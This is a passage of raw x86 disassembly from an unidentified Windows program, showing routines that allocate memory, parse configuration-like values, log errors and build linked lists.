  404bf5:	mov    edi,DWORD PTR [ebp+0xc]
  404bf8:	mov    ebx,edx
  404bfa:	mov    DWORD PTR [ebp-0x4],ecx
  404bfd:	cmp    edi,0xffffffff
  404c00:	jne    0x404c07
  404c02:	push   0xd
  404c04:	pop    eax
  404c05:	jmp    0x404c52
  404c07:	push   0x18
  404c09:	push   0x8
  404c0b:	call   DWORD PTR ds:0x409050
  404c11:	push   eax
  404c12:	call   DWORD PTR ds:0x409048
  404c18:	mov    esi,eax
  404c1a:	test   esi,esi
  404c1c:	jne    0x404c22
  404c1e:	push   0xe
  404c20:	jmp    0x404c04
  404c22:	mov    eax,ds:0x4083b0
  404c27:	mov    edx,ebx
  404c29:	mov    ecx,DWORD PTR [ebp-0x4]
  404c2c:	or     DWORD PTR [esi+0x8],0xffffffff
  404c30:	mov    DWORD PTR [esi],eax
  404c32:	mov    eax,DWORD PTR [ebp+0x8]
  404c35:	mov    DWORD PTR [esi+0x14],eax
  404c38:	mov    eax,ds:0x4083b8
  404c3d:	mov    DWORD PTR ds:0x4083b0,esi
  404c43:	mov    DWORD PTR [esi+0x10],edi
  404c46:	mov    DWORD PTR [esi+0xc],eax
  404c49:	call   0x404719
  404c4e:	test   eax,eax
  404c50:	je     0x404c5d
  404c52:	push   eax
  404c53:	call   DWORD PTR ds:0x409014
  404c59:	xor    eax,eax
  404c5b:	jmp    0x404c5f
  404c5d:	mov    eax,esi
  404c5f:	pop    edi
  404c60:	pop    esi
  404c61:	pop    ebx
  404c62:	mov    esp,ebp
  404c64:	pop    ebp
  404c65:	ret    0x8
  404c68:	int3   
  404c69:	int3   
  404c6a:	int3   
  404c6b:	int3   
  404c6c:	int3   
  404c6d:	mov    edi,edi
  404c6f:	push   ebp
  404c70:	mov    ebp,esp
  404c72:	fld1   
  404c74:	fld    QWORD PTR ds:0x4083c0
  404c7a:	fcom   st(1)
  404c7c:	fnstsw ax
  404c7e:	push   esi
  404c7f:	push   edi
  404c80:	mov    edi,edx
  404c82:	mov    esi,ecx
  404c84:	fstp   st(1)
  404c86:	test   ah,0x5
  404c89:	jp     0x404c9d
  404c8b:	push   DWORD PTR [ebp+0x10]
  404c8e:	fstp   st(0)
  404c90:	push   DWORD PTR [ebp+0xc]
  404c93:	push   DWORD PTR [ebp+0x8]
  404c96:	call   0x40487e
  404c9b:	jmp    0x404d0b
  404c9d:	fcomp  QWORD PTR ds:0x402e58
  404ca3:	fnstsw ax
  404ca5:	test   ah,0x1
  404ca8:	jne    0x404cb7
  404caa:	push   DWORD PTR [ebp+0x14]
  404cad:	push   DWORD PTR [ebp+0x10]
  404cb0:	call   0x404bec
  404cb5:	jmp    0x404d0b
  404cb7:	test   esi,esi
  404cb9:	je     0x404ccc
  404cbb:	cmp    DWORD PTR [ebp+0x8],0x0
  404cbf:	je     0x404ccc
  404cc1:	push   DWORD PTR [ebp+0x10]
  404cc4:	push   DWORD PTR [ebp+0xc]
  404cc7:	push   DWORD PTR [ebp+0x8]
  404cca:	jmp    0x404d06
  404ccc:	cmp    edi,0xa
  404ccf:	jbe    0x404cfd
  404cd1:	push   0x29
  404cd3:	pop    eax
  404cd4:	cmp    ax,WORD PTR [esi+edi*2-0x2]
  404cd9:	jne    0x404cfd
  404cdb:	push   0x9
  404cdd:	push   0x402994
  404ce2:	push   esi
  404ce3:	call   DWORD PTR ds:0x409170
  404ce9:	add    esp,0xc
  404cec:	test   eax,eax
  404cee:	jne    0x404cfd
  404cf0:	push   DWORD PTR [ebp+0x10]
  404cf3:	lea    edx,[edi-0xa]
  404cf6:	push   eax
  404cf7:	push   eax
  404cf8:	lea    ecx,[esi+0x12]
  404cfb:	jmp    0x404d06
  404cfd:	push   DWORD PTR [ebp+0x10]
  404d00:	xor    edx,edx
  404d02:	xor    ecx,ecx
  404d04:	push   edi
  404d05:	push   esi
  404d06:	call   0x404ab6
  404d0b:	pop    edi
  404d0c:	pop    esi
  404d0d:	pop    ebp
  404d0e:	ret    0x10
  404d11:	int3   
  404d12:	int3   
  404d13:	int3   
  404d14:	int3   
  404d15:	int3   
  404d16:	mov    edi,edi
  404d18:	push   ebp
  404d19:	mov    ebp,esp
  404d1b:	sub    esp,0xc
  404d1e:	lea    eax,[ebp-0x8]
  404d21:	mov    edx,0x4013a8
  404d26:	push   ebx
  404d27:	push   esi
  404d28:	push   edi
  404d29:	push   eax
  404d2a:	mov    ebx,ecx
  404d2c:	xor    esi,esi
  404d2e:	call   0x403fdc
  404d33:	mov    edi,eax
  404d35:	test   edi,edi
  404d37:	jne    0x404d54
  404d39:	push   0x401258
  404d3e:	push   0x4013a8
  404d43:	push   0x2
  404d45:	push   0x6c
  404d47:	call   0x4068f5
  404d4c:	add    esp,0x10
  404d4f:	push   0xd
  404d51:	pop    esi
  404d52:	jmp    0x404d91
  404d54:	lea    eax,[ebp-0x4]
  404d57:	mov    edx,0x401474
  404d5c:	push   eax
  404d5d:	mov    ecx,ebx
  404d5f:	call   0x403fdc
  404d64:	test   eax,eax
  404d66:	jne    0x404d74
  404d68:	push   0x401258
  404d6d:	push   0x401474
  404d72:	jmp    0x404d43
  404d74:	mov    edx,DWORD PTR [ebp-0x8]
  404d77:	mov    ecx,edi
  404d79:	push   0xffffffff
  404d7b:	push   esi
  404d7c:	push   DWORD PTR [ebp-0x4]
  404d7f:	push   eax
  404d80:	call   0x404c6d
  404d85:	test   eax,eax
  404d87:	jne    0x404d91
  404d89:	call   DWORD PTR ds:0x409010
  404d8f:	mov    esi,eax
  404d91:	pop    edi
  404d92:	mov    eax,esi
  404d94:	pop    esi
  404d95:	pop    ebx
  404d96:	mov    esp,ebp
  404d98:	pop    ebp
  404d99:	ret    
  404d9a:	int3   
  404d9b:	int3   
  404d9c:	int3   
  404d9d:	int3   
  404d9e:	int3   
  404d9f:	mov    edi,edi
  404da1:	push   ebp
  404da2:	mov    ebp,esp
  404da4:	sub    esp,0x1c
  404da7:	push   ebx
  404da8:	push   esi
  404da9:	push   edi
  404daa:	lea    eax,[ebp-0x4]
  404dad:	mov    ebx,ecx
  404daf:	mov    esi,0x4012f4
  404db4:	mov    DWORD PTR [ebp-0x10],ebx
  404db7:	xor    edi,edi
  404db9:	mov    edx,esi
  404dbb:	and    DWORD PTR [ebp-0xc],edi
  404dbe:	push   eax
  404dbf:	call   0x403fdc
  404dc4:	mov    DWORD PTR [ebp-0x14],eax
  404dc7:	test   eax,eax
  404dc9:	jne    0x404de5
  404dcb:	push   0x401178
  404dd0:	push   esi
  404dd1:	push   0x2
  404dd3:	push   0x6c
  404dd5:	call   0x4068f5
  404dda:	add    esp,0x10
  404ddd:	push   0xd
  404ddf:	pop    ebx
  404de0:	jmp    0x405073
  404de5:	mov    eax,DWORD PTR [ebp-0x4]
  404de8:	mov    edx,0x4012bc
  404ded:	mov    ecx,ebx
  404def:	lea    eax,[eax*2+0x9]
  404df6:	shr    eax,0x3
  404df9:	lea    eax,[eax*8+0x28]
  404e00:	mov    DWORD PTR [ebp-0x1c],eax
  404e03:	mov    esi,eax
  404e05:	lea    eax,[ebp-0x8]
  404e08:	push   eax
  404e09:	call   0x403fdc
  404e0e:	mov    DWORD PTR [ebp-0x18],eax
  404e11:	test   eax,eax
  404e13:	je     0x404e25
  404e15:	mov    eax,DWORD PTR [ebp-0x8]
  404e18:	lea    eax,[eax*2+0x9]
  404e1f:	shr    eax,0x3
  404e22:	lea    esi,[esi+eax*8]
  404e25:	push   esi
  404e26:	push   0x8
  404e28:	call   DWORD PTR ds:0x409050
  404e2e:	push   eax
  404e2f:	call   DWORD PTR ds:0x409048
  404e35:	mov    edi,eax
  404e37:	test   edi,edi
  404e39:	jne    0x404e50
  404e3b:	push   0x723
  404e40:	push   0x2
  404e42:	push   0x66
  404e44:	call   0x4068f5
  404e49:	add    esp,0xc
  404e4c:	push   0xe
  404e4e:	jmp    0x404ddf
  404e50:	mov    edx,DWORD PTR [ebp-0x4]
  404e53:	lea    ecx,[edi+0x28]
  404e56:	push   DWORD PTR [ebp-0x14]
  404e59:	mov    DWORD PTR [edi+0x18],ecx
  404e5c:	lea    edx,[edx+0x1]
  404e5f:	call   0x4039a4
  404e64:	mov    eax,DWORD PTR [ebp-0x18]
  404e67:	test   eax,eax
  404e69:	je     0x404e7f
  404e6b:	mov    edx,DWORD PTR [ebp-0x8]
  404e6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e71:	add    ecx,edi
  404e73:	push   eax
  404e74:	lea    edx,[edx+0x1]
  404e77:	mov    DWORD PTR [edi+0x1c],ecx
  404e7a:	call   0x4039a4
  404e7f:	lea    eax,[ebp-0x4]
  404e82:	mov    edx,0x401284
  404e87:	push   eax
  404e88:	mov    ecx,ebx
  404e8a:	call   0x403fdc
  404e8f:	mov    esi,eax
  404e91:	mov    DWORD PTR [ebp-0x8],esi
  404e94:	test   esi,esi
  404e96:	jne    0x404eb6
  404e98:	push   0x401178
  404e9d:	push   0x401284
  404ea2:	push   0x2
  404ea4:	push   0x6c
  404ea6:	call   0x4068f5
  404eab:	add    esp,0x10
  404eae:	push   0xd
  404eb0:	pop    ebx
  404eb1:	jmp    0x405061
  404eb6:	mov    edx,DWORD PTR [ebp-0x4]
  404eb9:	lea    eax,[edi+0x8]
  404ebc:	push   eax
  404ebd:	mov    ecx,esi
  404ebf:	call   0x4044b2
  404ec4:	mov    ebx,eax
  404ec6:	test   ebx,ebx
  404ec8:	je     0x404f00
  404eca:	mov    ecx,DWORD PTR [ebp-0x4]
  404ecd:	xor    edx,edx
  404ecf:	mov    eax,DWORD PTR [ebp-0x8]
  404ed2:	push   0x401178
  404ed7:	push   0x401284
  404edc:	movzx  esi,WORD PTR [esi+ecx*2]
  404ee0:	push   eax
  404ee1:	push   0x2
  404ee3:	push   0x6e
  404ee5:	mov    WORD PTR [eax+ecx*2],dx
  404ee9:	call   0x4068f5
  404eee:	mov    eax,DWORD PTR [ebp-0x8]
  404ef1:	add    esp,0x14
  404ef4:	mov    ecx,DWORD PTR [ebp-0x4]
  404ef7:	mov    WORD PTR [eax+ecx*2],si
  404efb:	jmp    0x40505d
  404f00:	mov    esi,DWORD PTR [ebp-0x10]
  404f03:	lea    eax,[ebp-0x4]
  404f06:	push   eax
  404f07:	mov    edx,0x4012d8
  404f0c:	mov    BYTE PTR ds:0x4083bc,0x0
  404f13:	mov    ecx,esi
  404f15:	mov    DWORD PTR ds:0x408048,0x1
  404f1f:	call   0x403fdc
  404f24:	test   eax,eax
  404f26:	je     0x404f4f
  404f28:	mov    edx,DWORD PTR [ebp-0x4]
  404f2b:	lea    ecx,[ebp-0xc]
  404f2e:	push   ecx
  404f2f:	push   0xffffffff
  404f31:	mov    ecx,eax
  404f33:	call   0x4043d3
  404f38:	test   al,al
  404f3a:	je     0x404f4f
  404f3c:	mov    eax,DWORD PTR [ebp-0xc]
  404f3f:	test   eax,eax
  404f41:	js     0x404f4f
  404f43:	mov    ds:0x408048,eax
  404f48:	mov    BYTE PTR ds:0x4083bc,0x1
  404f4f:	and    DWORD PTR [edi+0x20],0x0
  404f53:	lea    eax,[ebp-0x4]
  404f56:	push   eax
  404f57:	mov    edx,0x4012a0
  404f5c:	mov    ecx,esi
  404f5e:	call   0x403fdc
  404f63:	mov    DWORD PTR [ebp-0xc],eax
  404f66:	test   eax,eax
  404f68:	je     0x404f81
  404f6a:	mov    edx,DWORD PTR [ebp-0x4]
  404f6d:	mov    ecx,eax
  404f6f:	push   0x3
  404f71:	push   0x402d50
  404f76:	call   0x404329
  404f7b:	mov    DWORD PTR [edi+0x20],eax
  404f7e:	mov    eax,DWORD PTR [ebp-0xc]
  404f81:	cmp    DWORD PTR [edi+0x20],0x0
  404f85:	jne    0x404fc9
  404f87:	test   eax,eax
  404f89:	je     0x404fc2
  404f8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404f8e:	xor    edx,edx
  404f90:	movzx  esi,WORD PTR [eax+ecx*2]
  404f94:	mov    WORD PTR [eax+ecx*2],dx
  404f98:	push   DWORD PTR ds:0x402d50
  404f9e:	push   0x401178
  404fa3:	push   0x4012a0
  404fa8:	push   eax
  404fa9:	push   0x1
  404fab:	push   0x6f
  404fad:	call   0x4068f5
  404fb2:	mov    eax,DWORD PTR [ebp-0xc]
  404fb5:	add    esp,0x18
  404fb8:	mov    ecx,DWORD PTR [ebp-0x4]
  404fbb:	mov    WORD PTR [eax+ecx*2],si
  404fbf:	mov    esi,DWORD PTR [ebp-0x10]
  404fc2:	mov    DWORD PTR [edi+0x20],0x402d50
  404fc9:	and    DWORD PTR [edi+0x24],0x0
  404fcd:	lea    eax,[ebp-0x4]
  404fd0:	push   eax
  404fd1:	mov    edx,0x40131c
  404fd6:	mov    ecx,esi
  404fd8:	call   0x403fdc
  404fdd:	mov    DWORD PTR [ebp-0x10],eax
  404fe0:	test   eax,eax
  404fe2:	je     0x404ffb
  404fe4:	mov    edx,DWORD PTR [ebp-0x4]
  404fe7:	mov    ecx,eax
  404fe9:	push   0x2
  404feb:	push   0x402a20
  404ff0:	call   0x404329
  404ff5:	mov    DWORD PTR [edi+0x24],eax
  404ff8:	mov    eax,DWORD PTR [ebp-0x10]
  404ffb:	cmp    DWORD PTR [edi+0x24],0x0
  404fff:	jne    0x405040
  405001:	test   eax,eax
  405003:	je     0x405039
  405005:	mov    ecx,DWORD PTR [ebp-0x4]
  405008:	xor    edx,edx
  40500a:	movzx  esi,WORD PTR [eax+ecx*2]
  40500e:	mov    WORD PTR [eax+ecx*2],dx
  405012:	push   DWORD PTR ds:0x402a20
  405018:	push   0x401178
  40501d:	push   0x40131c
  405022:	push   eax
  405023:	push   0x1
  405025:	push   0x6f
  405027:	call   0x4068f5
  40502c:	mov    eax,DWORD PTR [ebp-0x10]
  40502f:	add    esp,0x18
  405032:	mov    ecx,DWORD PTR [ebp-0x4]
  405035:	mov    WORD PTR [eax+ecx*2],si
  405039:	mov    DWORD PTR [edi+0x24],0x402a20
  405040:	and    DWORD PTR [edi],0x0
  405043:	mov    eax,ds:0x4083a8
  405048:	test   eax,eax
  40504a:	jne    0x405056
  40504c:	mov    DWORD PTR ds:0x4083a8,edi
  405052:	jmp    0x40507a
  405054:	mov    eax,DWORD PTR [eax]
  405056:	cmp    DWORD PTR [eax],0x0
  405059:	jne    0x405054
  40505b:	mov    DWORD PTR [eax],edi
  40505d:	test   ebx,ebx
  40505f:	je     0x40507a
  405061:	push   edi
  405062:	push   0x0
  405064:	call   DWORD PTR ds:0x409050
  40506a:	push   eax
  40506b:	call   DWORD PTR ds:0x409054
  405071:	xor    edi,edi
  405073:	push   ebx
  405074:	call   DWORD PTR ds:0x409014
  40507a:	mov    eax,edi
  40507c:	pop    edi
  40507d:	pop    esi
  40507e:	pop    ebx
  40507f:	mov    esp,ebp
  405081:	pop    ebp
  405082:	ret    
  405083:	int3   
  405084:	int3   
  405085:	int3   
  405086:	int3   
  405087:	int3   
  405088:	mov    edi,edi
  40508a:	push   ebp
  40508b:	mov    ebp,esp
  40508d:	sub    esp,0x14
  405090:	push   ebx
  405091:	push   esi
  405092:	push   edi
  405093:	push   0x38
  405095:	pop    edi
  405096:	lea    eax,[ebp-0x4]
  405099:	mov    DWORD PTR [ebp-0x10],edx
  40509c:	mov    esi,ecx
  40509e:	mov    edx,0x40133c
  4050a3:	push   eax
  4050a4:	mov    DWORD PTR [ebp-0x8],esi
  4050a7:	call   0x403fdc
  4050ac:	mov    ebx,eax
  4050ae:	test   ebx,ebx
  4050b0:	je     0x4050c6
  4050b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4050b5:	lea    ecx,[ecx*2+0x9]
  4050bc:	shr    ecx,0x3
  4050bf:	lea    edi,[ecx*8+0x38]
  4050c6:	push   edi
  4050c7:	push   0x8
  4050c9:	call   DWORD PTR ds:0x409050
  4050cf:	push   eax
  4050d0:	call   DWORD PTR ds:0x409048
  4050d6:	mov    edi,eax
  4050d8:	test   edi,edi
  4050da:	jne    0x4050f5
  4050dc:	push   0x7a2
  4050e1:	push   0x2
  4050e3:	push   0x66
  4050e5:	call   0x4068f5
  4050ea:	add    esp,0xc
  4050ed:	push   0xe
  4050ef:	pop    ebx
  4050f0:	jmp    0x4053fa
  4050f5:	test   ebx,ebx
  4050f7:	je     0x40510f
  4050f9:	mov    edx,DWORD PTR [ebp-0x4]
  4050fc:	lea    ecx,[edi+0x38]
  4050ff:	push   ebx
  405100:	mov    DWORD PTR [edi+0x18],ecx
  405103:	lea    edx,[edx+0x1]
  405106:	call   0x4039a4
  40510b:	xor    ebx,ebx
  40510d:	jmp    0x405114
  40510f:	xor    ebx,ebx
  405111:	mov    DWORD PTR [edi+0x18],ebx
  405114:	lea    eax,[ebp-0x4]
  405117:	mov    edx,0x401480
  40511c:	push   eax
  40511d:	mov    ecx,esi
  40511f:	call   0x403fdc
  405124:	test   eax,eax
  405126:	je     0x40516a
  405128:	push   DWORD PTR [ebp-0x4]
  40512b:	lea    esi,[edi+0x2c]
  40512e:	mov    edx,eax
  405130:	mov    ecx,esi
  405132:	call   0x403a15
  405137:	mov    ebx,eax
  405139:	test   ebx,ebx
  40513b:	jne    0x4053a3
  405141:	mov    eax,DWORD PTR [esi]
  405143:	mov    edx,ebx
  405145:	cmp    WORD PTR [eax],bx
  405148:	je     0x405167
  40514a:	mov    ecx,ebx
  40514c:	mov    eax,DWORD PTR [esi]
  40514e:	cmp    WORD PTR [ecx+eax*1],0x2c
  405153:	jne    0x40515b
  405155:	xor    ebx,ebx
  405157:	mov    WORD PTR [ecx+eax*1],bx
  40515b:	mov    eax,DWORD PTR [esi]
  40515d:	inc    edx
  40515e:	lea    ecx,[edx+edx*1]
  405161:	cmp    WORD PTR [ecx+eax*1],bx
  405165:	jne    0x40514c
  405167:	mov    esi,DWORD PTR [ebp-0x8]
  40516a:	lea    eax,[ebp-0x4]
  40516d:	mov    edx,0x4014ac
  405172:	push   eax
  405173:	mov    ecx,esi
  405175:	call   0x403fdc
  40517a:	test   eax,eax
  40517c:	je     0x4051f4
  40517e:	push   DWORD PTR [ebp-0x4]
  405181:	lea    ecx,[edi+0x30]
  405184:	mov    edx,eax
  405186:	call   0x403a15
  40518b:	mov    ebx,eax
  40518d:	test   ebx,ebx
  40518f:	jne    0x4053a3
  405195:	lea    eax,[ebp-0x4]
  405198:	mov    edx,0x4014bc
  40519d:	push   eax
  40519e:	mov    ecx,esi
  4051a0:	call   0x403fdc
  4051a5:	test   eax,eax
  4051a7:	je     0x4051d1
  4051a9:	mov    ecx,DWORD PTR [ebp-0x10]
  4051ac:	mov    ecx,DWORD PTR [ecx+0x20]
  4051af:	cmp    DWORD PTR [ecx+0x8],0x1
  4051b3:	jne    0x40521d
  4051b5:	cmp    DWORD PTR [ecx+0xc],ebx
  4051b8:	jne    0x40521d
  4051ba:	push   DWORD PTR [ebp-0x4]
  4051bd:	lea    ecx,[edi+0x34]
  4051c0:	mov    edx,eax
  4051c2:	call   0x403a15
  4051c7:	mov    ebx,eax
  4051c9:	test   ebx,ebx
  4051cb:	jne    0x4053a3
  4051d1:	lea    eax,[ebp-0x4]
  4051d4:	mov    ebx,0x401330
  4051d9:	push   eax
  4051da:	mov    edx,ebx
  4051dc:	mov    ecx,esi
  4051de:	call   0x403fdc
  4051e3:	mov    esi,eax
  4051e5:	mov    DWORD PTR [ebp-0xc],esi
  4051e8:	test   esi,esi
  4051ea:	jne    0x405225
  4051ec:	push   0x4011a0
  4051f1:	push   ebx
  4051f2:	jmp    0x405211
  4051f4:	fld    QWORD PTR ds:0x402e50
  4051fa:	fcomp  QWORD PTR ds:0x4083c0
  405200:	fnstsw ax
  405202:	test   ah,0x41
  405205:	jp     0x405195
  405207:	push   0x4011a0
  40520c:	push   0x4014ac
  405211:	push   0x2
  405213:	push   0x6c
  405215:	call   0x4068f5
  40521a:	add    esp,0x10
  40521d:	push   0xd
  40521f:	pop    ebx
  405220:	jmp    0x4053a3
  405225:	mov    edx,DWORD PTR [ebp-0x4]
  405228:	lea    eax,[edi+0x8]
  40522b:	push   eax
  40522c:	mov    ecx,esi
  40522e:	call   0x4044b2
  405233:	mov    ebx,eax
  405235:	test   ebx,ebx
  405237:	je     0x40526f
  405239:	mov    ecx,DWORD PTR [ebp-0x4]
  40523c:	xor    edx,edx
  40523e:	mov    eax,DWORD PTR [ebp-0xc]
  405241:	push   0x4011a0
  405246:	push   0x401330
  40524b:	movzx  esi,WORD PTR [esi+ecx*2]
  40524f:	push   eax
  405250:	push   0x2
  405252:	push   0x6e
  405254:	mov    WORD PTR [eax+ecx*2],dx
  405258:	call   0x4068f5
  40525d:	mov    eax,DWORD PTR [ebp-0xc]
  405260:	add    esp,0x14
  405263:	mov    ecx,DWORD PTR [ebp-0x4]
  405266:	mov    WORD PTR [eax+ecx*2],si
  40526a:	jmp    0x40539f
  40526f:	mov    esi,DWORD PTR [ebp-0x8]
  405272:	mov    edx,0x401350
  405277:	mov    ecx,esi
  405279:	call   0x404385
  40527e:	mov    DWORD PTR [ebp-0xc],eax
  405281:	mov    edx,0x401344
  405286:	lea    eax,[ebp-0x4]
  405289:	mov    ecx,esi
  40528b:	push   eax
  40528c:	call   0x403fdc
  405291:	test   eax,eax
  405293:	je     0x4052c4
  405295:	push   DWORD PTR [ebp-0xc]
  405298:	mov    edx,DWORD PTR [ebp-0x4]
  40529b:	mov    ecx,eax
  40529d:	push   0x1
  40529f:	push   0x0
  4052a1:	push   0x0
  4052a3:	call   0x404c6d
  4052a8:	test   eax,eax
  4052aa:	je     0x4052b7
  4052ac:	mov    ecx,DWORD PTR [eax+0x10]
  4052af:	mov    DWORD PTR [edi+0x24],ecx
  4052b2:	mov    DWORD PTR [edi+0x20],eax
  4052b5:	jmp    0x4052c8
  4052b7:	call   DWORD PTR ds:0x409010
  4052bd:	mov    ebx,eax
  4052bf:	jmp    0x40539f
  4052c4:	or     DWORD PTR [edi+0x24],0xffffffff
  4052c8:	mov    edx,0x401378
  4052cd:	mov    ecx,esi
  4052cf:	call   0x404385
  4052d4:	mov    DWORD PTR [ebp-0xc],eax
  4052d7:	mov    edx,0x401360
  4052dc:	lea    eax,[ebp-0x4]
  4052df:	mov    ecx,esi
  4052e1:	push   eax
  4052e2:	call   0x403fdc
  4052e7:	test   eax,eax
  4052e9:	je     0x40530a
  4052eb:	push   DWORD PTR [ebp-0xc]
  4052ee:	mov    edx,DWORD PTR [ebp-0x4]
  4052f1:	mov    ecx,eax
  4052f3:	push   0x2
  4052f5:	push   0x0
  4052f7:	push   0x0
  4052f9:	call   0x404c6d
  4052fe:	test   eax,eax
  405300:	je     0x4052b7
  405302:	mov    eax,DWORD PTR [eax+0x10]
  405305:	mov    DWORD PTR [edi+0x28],eax
  405308:	jmp    0x40530e
  40530a:	or     DWORD PTR [edi+0x28],0xffffffff
  40530e:	and    DWORD PTR [edi+0x1c],0x0
  405312:	lea    eax,[ebp-0x4]
  405315:	push   eax
  405316:	mov    edx,0x401394
  40531b:	mov    ecx,esi
  40531d:	call   0x403fdc
  405322:	mov    DWORD PTR [ebp-0xc],eax
  405325:	test   eax,eax
  405327:	je     0x405340
  405329:	mov    edx,DWORD PTR [ebp-0x4]
  40532c:	mov    ecx,eax
  40532e:	push   0x6
  405330:	push   0x402ca0
  405335:	call   0x404329
  40533a:	mov    DWORD PTR [edi+0x1c],eax
  40533d:	mov    eax,DWORD PTR [ebp-0xc]
  405340:	xor    edx,edx
  405342:	cmp    DWORD PTR [edi+0x1c],edx
  405345:	jne    0x405386
  405347:	test   eax,eax
  405349:	je     0x40537f
  40534b:	mov    ecx,DWORD PTR [ebp-0x4]
  40534e:	movzx  esi,WORD PTR [eax+ecx*2]
  405352:	mov    WORD PTR [eax+ecx*2],dx
  405356:	push   DWORD PTR ds:0x402ca0
  40535c:	push   0x4011a0
  405361:	push   0x401394
  405366:	push   eax
  405367:	push   0x1
  405369:	push   0x6f
  40536b:	call   0x4068f5
  405370:	mov    eax,DWORD PTR [ebp-0xc]
  405373:	add    esp,0x18
  405376:	mov    ecx,DWORD PTR [ebp-0x4]
  405379:	xor    edx,edx
  40537b:	mov    WORD PTR [eax+ecx*2],si
  40537f:	mov    DWORD PTR [edi+0x1c],0x402ca0
  405386:	mov    ecx,DWORD PTR [ebp-0x10]
  405389:	mov    DWORD PTR [edi],edx
  40538b:	mov    eax,DWORD PTR [ecx+0x4]
  40538e:	test   eax,eax
  405390:	jne    0x405399
  405392:	mov    DWORD PTR [ecx+0x4],edi
  405395:	jmp    0x405401
  405397:	mov    eax,DWORD PTR [eax]
  405399:	cmp    DWORD PTR [eax],edx
  40539b:	jne    0x405397
  40539d:	mov    DWORD PTR [eax],edi
  40539f:	test   ebx,ebx
  4053a1:	je     0x405401
  4053a3:	xor    esi,esi
  4053a5:	cmp    DWORD PTR [edi+0x2c],esi
  4053a8:	je     0x4053bb
  4053aa:	push   DWORD PTR [edi+0x2c]
  4053ad:	push   esi
  4053ae:	call   DWORD PTR ds:0x409050
  4053b4:	push   eax
  4053b5:	call   DWORD PTR ds:0x409054
  4053bb:	cmp    DWORD PTR [edi+0x30],0x0
  4053bf:	je     0x4053d2
  4053c1:	push   DWORD PTR [edi+0x30]
  4053c4:	push   esi
  4053c5:	call   DWORD PTR ds:0x409050
  4053cb:	push   eax
  4053cc:	call   DWORD PTR ds:0x409054
  4053d2:	cmp    DWORD PTR [edi+0x34],0x0
  4053d6:	je     0x4053e9
  4053d8:	push   DWORD PTR [edi+0x34]
  4053db:	push   esi
  4053dc:	call   DWORD PTR ds:0x409050
  4053e2:	push   eax
  4053e3:	call   DWORD PTR ds:0x409054
  4053e9:	push   edi
  4053ea:	push   esi
  4053eb:	call   DWORD PTR ds:0x409050
  4053f1:	push   eax
  4053f2:	call   DWORD PTR ds:0x409054
  4053f8:	mov    edi,esi
  4053fa:	push   ebx
  4053fb:	call   DWORD PTR ds:0x409014
  405401:	mov    eax,edi
  405403:	pop    edi
  405404:	pop    esi
  405405:	pop    ebx
  405406:	mov    esp,ebp
  405408:	pop    ebp
  405409:	ret    
  40540a:	int3   
  40540b:	int3   
  40540c:	int3   
  40540d:	int3   
  40540e:	int3   
  40540f:	mov    edi,edi
  405411:	push   ebp
  405412:	mov    ebp,esp
  405414:	sub    esp,0x10
  405417:	push   ebx
  405418:	push   esi
  405419:	mov    eax,ecx
  40541b:	mov    edx,0x40133c
  405420:	xor    ecx,ecx
  405422:	mov    DWORD PTR [ebp-0xc],eax
  405425:	push   edi
  405426:	push   0x50
  405428:	mov    DWORD PTR [ebp-0x10],ecx
  40542b:	mov    ebx,ecx
  40542d:	mov    DWORD PTR [ebp-0x8],ecx
  405430:	lea    ecx,[ebp-0x4]
  405433:	pop    edi
  405434:	push   ecx
  405435:	mov    ecx,eax
  405437:	call   0x403fdc
  40543c:	mov    esi,eax
  40543e:	test   esi,esi
  405440:	je     0x405456
  405442:	mov    eax,DWORD PTR [ebp-0x4]
  405445:	lea    eax,[eax*2+0x9]
  40544c:	shr    eax,0x3
  40544f:	lea    edi,[eax*8+0x50]
  405456:	push   edi
  405457:	push   0x8
  405459:	call   DWORD PTR ds:0x409050
  40545f:	push   eax
  405460:	call   DWORD PTR ds:0x409048
  405466:	mov    edi,eax
  405468:	test   edi,edi
  40546a:	jne    0x405474
  40546c:	push   0xe
  40546e:	pop    ebx
  40546f:	jmp    0x405a2c
  405474:	test   esi,esi
  405476:	je     0x40548c
  405478:	mov    edx,DWORD PTR [ebp-0x4]
  40547b:	lea    ecx,[edi+0x50]
  40547e:	push   esi
  40547f:	mov    DWORD PTR [edi+0x4],ecx
  405482:	lea    edx,[edx+0x1]
  405485:	call   0x4039a4
  40548a:	jmp    0x405491
  40548c:	xor    eax,eax
  40548e:	mov    DWORD PTR [edi+0x4],eax
  405491:	mov    esi,DWORD PTR [ebp-0xc]
  405494:	lea    eax,[ebp-0x4]
  405497:	push   eax
  405498:	mov    edx,0x401490
  40549d:	mov    ecx,esi
  40549f:	call   0x403fdc
  4054a4:	mov    edx,eax
  4054a6:	test   edx,edx
  4054a8:	jne    0x4054ce
  4054aa:	mov    edx,DWORD PTR [ebp+0x8]
  4054ad:	mov    edx,DWORD PTR [edx+0x2c]
  4054b0:	test   edx,edx
  4054b2:	je     0x4054e4
  4054b4:	mov    ecx,edx
  4054b6:	lea    ebx,[ecx+0x2]
  4054b9:	mov    ax,WORD PTR [ecx]
  4054bc:	add    ecx,0x2
  4054bf:	cmp    ax,WORD PTR [ebp-0x10]
  4054c3:	jne    0x4054b9
  4054c5:	sub    ecx,ebx
  4054c7:	sar    ecx,1
  4054c9:	mov    DWORD PTR [ebp-0x4],ecx
  4054cc:	jmp    0x4054d1
  4054ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4054d1:	push   ecx
  4054d2:	lea    ecx,[edi+0x44]
  4054d5:	call   0x403a15
  4054da:	mov    ebx,eax
  4054dc:	test   ebx,ebx
  4054de:	jne    0x4059d5
  4054e4:	lea    eax,[ebp-0x4]
  4054e7:	mov    edx,0x4014a0
  4054ec:	push   eax
  4054ed:	mov    ecx,esi
  4054ef:	call   0x403fdc
  4054f4:	test   eax,eax
  4054f6:	je     0x40550f
  4054f8:	push   DWORD PTR [ebp-0x4]
  4054fb:	lea    ecx,[edi+0x48]
  4054fe:	mov    edx,eax
  405500:	call   0x403a15
  405505:	mov    ebx,eax
  405507:	test   ebx,ebx
  405509:	jne    0x4059d5
  40550f:	lea    eax,[ebp-0x4]
  405512:	mov    edx,0x4014ac
  405517:	push   eax
  405518:	mov    ecx,esi
  40551a:	call   0x403fdc
  40551f:	test   eax,eax
  405521:	je     0x40553a
  405523:	push   DWORD PTR [ebp-0x4]
  405526:	lea    ecx,[edi+0x4c]
  405529:	mov    edx,eax
  40552b:	call   0x403a15
